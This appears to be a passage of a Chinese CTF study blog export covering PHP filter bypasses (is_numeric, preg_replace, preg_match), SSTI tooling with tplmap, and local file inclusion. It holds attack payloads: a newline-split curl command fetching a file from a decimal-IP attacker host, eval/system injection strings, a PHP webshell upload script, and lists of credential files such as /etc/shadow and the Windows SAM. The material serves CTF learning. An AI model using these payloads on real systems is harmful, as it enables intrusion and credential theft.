class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span>sF<span class="variable">%DC</span><span class="variable">%91</span>f<span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%11</span><span class="variable">%8</span>F<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%B6</span><span class="variable">%21</span><span class="variable">%B2V</span><span class="variable">%0</span>F<span class="variable">%F9</span><span class="variable">%CAg</span><span class="variable">%CC</span><span class="variable">%A8</span><span class="variable">%C7</span><span class="variable">%F8</span><span class="variable">%5</span>B<span class="variable">%A8Ly</span><span class="variable">%03</span><span class="variable">%0</span>C<span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%E2</span><span class="variable">%18</span><span class="variable">%F8m</span><span class="variable">%B3</span><span class="variable">%A9</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%D5</span><span class="variable">%DFE</span><span class="variable">%C1O</span><span class="variable">%26</span><span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B3</span><span class="variable">%DC8</span><span class="variable">%E9j</span><span class="variable">%C2</span>/<span class="variable">%E7</span><span class="variable">%BDr</span><span class="variable">%8</span>F<span class="variable">%0</span>EE<span class="variable">%BC</span><span class="variable">%E0F</span><span class="variable">%D2</span><span class="variable">%3</span>CW<span class="variable">%0</span>F<span class="variable">%EB</span><span class="variable">%14</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%BBU.</span><span class="variable">%F5</span><span class="variable">%A0</span><span class="variable">%A8</span><span class="variable">%2</span>B<span class="variable">%E31</span><span class="variable">%FE</span><span class="variable">%A4</span><span class="variable">%807</span><span class="variable">%B8</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%1</span>F<span class="variable">%0</span>E<span class="number">3</span>.<span class="variable">%DF</span><span class="variable">%93</span><span class="variable">%AC5</span><span class="variable">%00</span><span class="variable">%EBM</span><span class="variable">%DC</span><span class="variable">%0</span>D<span class="variable">%EC</span><span class="variable">%C1</span><span class="variable">%A8dy</span><span class="variable">%0</span>Cx<span class="variable">%2</span>Cv<span class="variable">%21</span>V<span class="variable">%60</span><span class="variable">%DD0</span><span class="variable">%97</span><span class="variable">%91</span><span class="variable">%D0k</span><span class="variable">%D0</span><span class="variable">%AF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A4</span><span class="variable">%BCF</span><span class="variable">%29</span><span class="variable">%B1</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>is_numberic</title>
    <url>/2024/07/13/is-numberic/</url>
    <content><![CDATA[<p>&emsp;&emsp;is_numeric()函数用于检查变量是否为数字或数字字符串。属于布尔类型，如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE，注意<font color=red>浮点型返回空值，即FALSE。</font></p>
<h3 id="空字符绕过"><a href="#空字符绕过" class="headerlink" title="空字符绕过"></a>空字符绕过</h3><p>&emsp;&emsp;可以借助URL编码中的空字符，例如%00或者%20，其中%00加在前面或者后面都可以，也就是%00404或者404%00，而%20只能放在末尾，比如404%20（%20准确来说是空格字符）  </p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">数字--&gt;非数字：</span><br><span class="line">数值<span class="comment">%20</span></span><br><span class="line"><span class="comment">%00数值</span></span><br><span class="line">数值<span class="comment">%00</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当然还可以这样构造:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">num</span>=1&#x27;</span><br><span class="line">?<span class="attribute">num</span>=1,</span><br><span class="line">?<span class="attribute">num</span>=1%00</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;都可以绕过判断</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; 其实题目的核心是弱比较的特性，我们只要知道这个函数的返回类型和作用就过关了(っ◞‸◟c)</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>php入门</title>
    <url>/2024/07/14/php%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>&emsp;&emsp;对于刚接触web题的时候，最先掌握的语言应该是php，不说所有知识点要了解，起码打web题的时候GET和POST方法要会辨别和使用，推荐PHP学习网站  <a href="https://www.runoob.com/php">https://www.runoob.com/php</a><br>&emsp;&emsp;生怕你们不会点，超链接都没有弄(っ’-‘)╮&#x3D;͟͟͞͞🎁) ﾟдﾟ ）</p>
<h3 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h3><p>&emsp;&emsp;也是生怕你们不看，单拎出来给你们了解一下 ( ੭ ˙ᗜ˙ )੭<br>&emsp;&emsp;GET方法，嗯……不知道怎么描述，直接看示例就知道了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>], <span class="string">&quot;&lt;BR&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&quot;&lt;BR&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;像是$_GET[‘id’]这样的，里面的参数就是变量，代表有个变量id可以通过URL?的形式进行传参，例如<strong><a href="http://127.0.0.1/?id=1">http://127.0.0.1?id=1</a></strong>,这样id的值就为1。</p>
<h3 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h3><p>&emsp;&emsp;和GET差不多，但传参的方式变了，像是你在网页输入的信息就是用的POST，如果没有你能点的或者输入的东西，就要用到hackbar了，什么，你不知道hackbar是什么？点这个了解一下吧：<a href="/2024/07/13/hackbar/">hackbar</a></p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp; 知道这两个方法之后，恭喜你，能做出大部分的web题目了，遇到不会的就去网上搜和问AI，web主要靠得是你的信息收集能力，加油吧，师傅们ｸﾞｯ!(๑•̀ㅂ•́)و✧</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>php_filter_chain_generator</title>
    <url>/2024/07/14/php-filter-chain-generator/</url>
    <content><![CDATA[<p>&emsp;&emsp;文件包含漏洞利用流在其中写入一句话木马，脚本下载<a href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;常用的命令（当然也可以看那里的）  </p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator<span class="selector-class">.py</span> <span class="attr">--chain</span> <span class="string">&#x27;一句话木马&#x27;</span></span><br></pre></td></tr></table></figure>
<p> <img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;将回显的链子复制给网页,然后用hackbar或者蚁剑连接即可。<br><img data-src="/images/php_filter2.png" alt="php_filter2"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>工具|脚本 利用</tag>
      </tags>
  </entry>
  <entry>
    <title>preg_replace</title>
    <url>/2024/07/12/preg-replace/</url>
    <content><![CDATA[<p>&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）<br>&emsp;&emsp;通常来说，它有三个参数，preg_repalce($pattern,$repalcement,$subject);–&gt;搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。<br>注：str_replace也是一样的特性，区别是正则的规则匹配</p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;HYNUCTF&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;菜，就多练&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;既然HYNUCTF组合会变为空那么可以通过双写拼接进行绕过，原理跟sql注入的关键字绕过差不多。<br>payload：HYNU<font color=red>HYNUCTF</font>CTF<br>&emsp;&emsp;红色部分被替换成了空，那么剩下的就拼接成了是吧。</p>
<h3 id="eval创建新变量绕过"><a href="#eval创建新变量绕过" class="headerlink" title="eval创建新变量绕过"></a>eval创建新变量绕过</h3><p>&emsp;&emsp;这是个很有用的地方，很多题型都适用这个，当遇到过滤了关键字符或者没有头绪的时候，可以使用这个方法进行创建一个新变量去执行它。<br>&emsp;&emsp;例如</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$str = preg_replace(<span class="string">&#x27;/system/&#x27;</span>,<span class="string">&quot;&quot;</span>,$_GET[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">······</span><br><span class="line">payload：  </span><br><span class="line">?str=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;A&#x27;</span>]);&amp;A=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这是利用eval执行system命令去寻找拥有flag的页面，后续同理我们可以使用GET和POST方法来进行绕过。</p>
<h3 id="经典漏洞-e"><a href="#经典漏洞-e" class="headerlink" title="经典漏洞&#x2F;e"></a>经典漏洞&#x2F;e</h3><p>&emsp;&emsp;preg_replace函数的特性，&#x2F;e可执行模式，此为PHP专有参数，例如preg_replace函数。也就是说，它的$repalcement部分会被当做命令执行。  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>],<span class="string">&quot;XTWASYS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;此时传入?str&#x3D;system(“ls”);就可执行此代码。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>print&amp;print_r</title>
    <url>/2024/07/13/print-print-r/</url>
    <content><![CDATA[<p>&emsp;&emsp;print()只能打印出简单类型变量的值（如int,string），输出一个字符串。<br>&emsp;&emsp;print_r()可以打印出复杂类型变量的值（如数组，对象），打印关于变量的易于理解的信息。通常打比赛的时候经常使用的是它。<br>&emsp;&emsp;建议实践，方便理解。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>区别</tag>
      </tags>
  </entry>
  <entry>
    <title>preg_match</title>
    <url>/2024/06/12/preg-match/</url>
    <content><![CDATA[<p>&emsp;&emsp;正则匹配也是php中最常见的一种，一般用来做一个<del>装饰</del>匹配作用，我们通常用以下几种绕过方式来规避正则匹配。</p>
<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>&emsp;&emsp;正则匹配后面都会有一个修饰符，各位要判断相应的修饰符选择哪一种绕过方式，别无脑套，推荐一个网站<a href="https://www.jyshare.com/front-end/854/">正则表达式在线测试</a>,它提供了修饰符的介绍和语法参考，方便我们继续匹配。། – _ – །</p>
<h3 id="换行符绕过（-0a）"><a href="#换行符绕过（-0a）" class="headerlink" title="换行符绕过（%0a）"></a>换行符绕过（%0a）</h3><p>&emsp;&emsp;通常的，preg_match()函数只能匹配一行数据，尤其是遇到这种情况<br><img data-src="/images/ciscn.png" alt="ciscn"><br>&emsp;&emsp;看着如此长的过滤，但因为修饰符只有一个i（忽略大小写），我们可以直接%0a绕过(过滤点的方式可以将IP转成十进制)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd=cu%0arl+http://795973494:8000/s -o /tmp/s</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;简单的来说，当遇到修饰符只有i的时候，可以用换行符%0a秒了。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^flag$/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>])</span></span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;因此我们传入?a&#x3D;flag%0a即可绕过</p>
<h3 id="利用数组绕过"><a href="#利用数组绕过" class="headerlink" title="利用数组绕过"></a>利用数组绕过</h3><p>&emsp;&emsp;同md5()函数原理，当参数是数组类型的时候，会以报错的形式来绕过判断。但值得一提的是，整个if条件不执行，如果里面是输出flag形式的，此方法无用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$a</span>)==<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这种我们可以用数组进行绕过，让if条件报错。不仅仅针对preg_match，数组绕过针对大多匹配的函数都有效，例如strcmp。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?a</span>[]=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="PCRE回溯限制绕过"><a href="#PCRE回溯限制绕过" class="headerlink" title="PCRE回溯限制绕过"></a>PCRE回溯限制绕过</h3><p>&emsp;&emsp;如何绕过呢，让回溯次数超过最大限制就可以使preg_match()函数返回false，从而绕过限制，中文的回溯次数在100万次就好崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS<br>payload:<br>GET:</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">import</span> <span class="variable">requests</span></span><br><span class="line"><span class="variable">from</span> <span class="variable">io</span> <span class="variable">import</span> <span class="variable">BytesIO</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> =<span class="function"><span class="title">BytesIO</span>(<span class="variable">b</span><span class="string">&#x27;[]&#x27;</span>+<span class="variable">b</span><span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>)</span></span><br><span class="line"><span class="variable">res</span> = <span class="variable">requests.get</span>(<span class="string">&#x27;[]?[]=&#x27;</span>+<span class="function"><span class="title">str</span>(<span class="variable">payload</span>))</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">res.text</span>)</span></span><br></pre></td></tr></table></figure>
<p>POST:  </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(b<span class="string">&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + b<span class="string">&#x27;a&#x27;</span> * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;[]&#x27;</span>, <span class="attribute">files</span>=files, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;[]即代表根据题目来填充</p>
<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>&emsp;&emsp;就是通过URL编码进行取反绕过，当然其他编码也是可以的，进制就更不用说了（通常使用十六进制），这里略微举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;phpinfo&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>取反得到%8F%97%8F%96%91%99%90（取反使用的使不可见字符，遇到&#x2F;s还是得寄）</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">?code=$_=~(%8F%97%8F%96%91%99%90);$_();</span><br></pre></td></tr></table></figure>


<h3 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h3><p>&emsp;&emsp;这个不常见，%5c其实就是”\“,了解一下就可以了</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$act</span>)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/i</span>不区分大小写</span><br><span class="line"></span><br><span class="line"><span class="string">/s</span>匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]</span><br><span class="line"></span><br><span class="line"><span class="string">/D</span>如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里存在&#x2F;s和&#x2F;D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p>
<h3 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h3><p>&emsp;&emsp;这个也不常用，在每一个字符前加上单引号可以绕过preg_match的匹配。<br><img data-src="/images/%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87.png" alt="单引号绕过"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>tplmap</title>
    <url>/2024/06/06/tplmap/</url>
    <content><![CDATA[<h2 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h2><h3 id="tplmap介绍"><a href="#tplmap介绍" class="headerlink" title="tplmap介绍"></a>tplmap介绍</h3><p>&emsp;&emsp;Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。（说的高级吧，其实选用其他博主的(●’◡’●)）实用指数⭐⭐⭐</p>
<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在kali或者linux安装即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;进入该文件夹下安装依赖（就是安装库啦）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tplmap</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如果安装报错了，不妨试一试pip2安装，别问我怎么知道的，我就是(ᇂ_ᇂ|||)</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt;?name=</span><br><span class="line">POST:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt; --data= name=</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/tplmap.png" alt="tplmap"></p>
<p>&emsp;&emsp;如上面所示，可以得出模板是jinja2，如果下面那一段显示yes或者ok，那么可以直接用shell指令（–os-shell）。</p>
<p>&emsp;&emsp;更多用法可以用help查看，很多python脚本都可以这样做(不认识英文直接去找翻译(ง •̀_•́)ง加油)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 tplmap.py --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>工具|脚本 利用</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集（CTF基础篇）</title>
    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
    <content><![CDATA[<p>&emsp;&emsp;信息收集作为CTF最常用的手段（直接给源码的不算），常规思路有  </p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">ctrl+U 查看源代码</span><br><span class="line">F12  查看js脚本</span><br><span class="line">robots<span class="selector-class">.txt</span> 文件泄露,在URL后面加上/robot<span class="selector-class">.txt</span>,可能会给出flag或所在路径</span><br><span class="line">www<span class="selector-class">.zip</span>   压缩包，同上用法</span><br><span class="line">dirsearch或御剑   扫描文件，转至</span><br><span class="line">BurpSuite  抓包找响应头，转至</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;基本思路就这些，剩下的就靠你的搜索能力了( ੭ ˙ᗜ˙ )੭</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2024/07/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>&emsp;&emsp;通过include或require语句，可以将PHP文件的内容插入另一个PHP文件（在服务器执行它之前）<br>&emsp;&emsp;<strong>include和require语句是相同的，除了错误处理方面</strong></p>
<ul>
<li>require会生成致命错误（E_COMPILE_ERROR）并停止脚本  </li>
<li>include只生成警告（E_WARNING）并且脚本会继续<br>&emsp;&emsp;因此，如果希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的PHP 应用程序编程中，请始终使用 reguire 向执行流用关键文件。这在某个关键文件意外丢失的情况下,有助于提高应用程序的安全性和完整性。<br>&emsp;&emsp;像是这样的文件包含函数还有  <figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">include_once</span><br><span class="line">require_once</span><br><span class="line">highlight_file</span><br><span class="line">show_source</span><br><span class="line"><span class="keyword">file</span></span><br><span class="line">readfile</span><br><span class="line">file_get_contents</span><br><span class="line">file_put_contents</span><br><span class="line"><span class="keyword">fopen</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>&emsp;&emsp;在此之前我们要知道，文件包含函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来，利用这个特性，我们可以读取一下包含敏感信息的文件，一些文件上传的漏洞也是因此而出来的。  </p>
<h3 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h3><p>&emsp;&emsp;既然include等函数能包含本地文件并回显出来，那么我们可以利用它去读取一些本地固有的文件，用得最多的是phpinfo();<br>&emsp;&emsp;出此之外，我们可以读取一些系统本地的敏感信息，例如__C:\Windows\system.ini__ ,这是属于<strong>绝对路径读取</strong>。 <strong>相对路径读取</strong>是通过.&#x2F; 表示当前位置路径，..&#x2F;表示上一级路径位置（在Linux中同样适用），例如当前页面所在路径为__C:\Apache24\htdocs_<em>,我们需要使用..&#x2F;推到C盘再进行访问，构造路径如下：</em><em>..&#x2F;..&#x2F;windows&#x2F;system.ini</em>_ 后面的路径穿越就是利用的这个原理，硕以说基础还是有必要学一学的。也就是打比赛找flag的时候，就用..&#x2F;..&#x2F;..&#x2F;……&#x2F;flag，推到flag所在的目录位置就可以了。<br>&emsp;&emsp;一些常见的敏感目录信息路径  </p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">Windows系统：  </span><br><span class="line">C:\boot.ini <span class="symbol">__</span>查看系统版本<span class="symbol">__</span></span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml __IIS配置文件<span class="symbol">__</span></span><br><span class="line">C:\windows\repair\sam <span class="symbol">__</span>存储Windows系统初次安装的密码<span class="symbol">__</span></span><br><span class="line">C:\ProgramFiles\mysql\my.ini __Mysql配置<span class="symbol">__</span></span><br><span class="line">C:\ProgramFiles\mysql\data\mysql\user.MYD __MySQL root密码<span class="symbol">__</span></span><br><span class="line">C:\windows\php.ini __php配置信息<span class="symbol">__</span></span><br></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Linux/Unix系统：</span><br><span class="line"><span class="regexp">/etc/</span>password __账户信息__</span><br><span class="line"><span class="regexp">/etc/</span>shadow __账户密码信息__</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/app/</span>apache2<span class="regexp">/conf/</span>httpd.conf __Apache2默认配置文件__</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/app/</span>apache2<span class="regexp">/conf/</span>extra/httpd-vhost.conf __虚拟网站配置__</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/app/</span>php5<span class="regexp">/lib/</span>php.ini __PHP相关配置__</span><br><span class="line"><span class="regexp">/etc/</span>httpd<span class="regexp">/conf/</span>httpd.conf __Apache配置文件__</span><br><span class="line"><span class="regexp">/etc/my</span>.conf __mysql配置文件__</span><br></pre></td></tr></table></figure>

<h3 id="LFI漏洞利用技巧"><a href="#LFI漏洞利用技巧" class="headerlink" title="LFI漏洞利用技巧"></a>LFI漏洞利用技巧</h3><h4 id="配合文件上传使用"><a href="#配合文件上传使用" class="headerlink" title="配合文件上传使用"></a>配合文件上传使用</h4><p>&emsp;&emsp; 属于文件上传了那就到那里去看吧(っ’-‘)╮&#x3D;͟͟͞͞💌  </p>
<h4 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h4><p>&emsp;&emsp;有些网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。<font color=red>在用户发起请求时，服务器会将请求写入access.log，当发送错误时写入error.log</font>可以用BP在里面编写一句话木马，像是这样<br><img data-src="/images/access.log.png" alt="access.log">  </p>
<h4 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h4><p>&emsp;&emsp;这个出现的不多，了解一下就好，就是找到SESSION文件。根据文件内容找到可控变量，在构造payload插入到文件中，最后包含就可以了。<br>&emsp;&emsp;常见的session存储路径：</p>
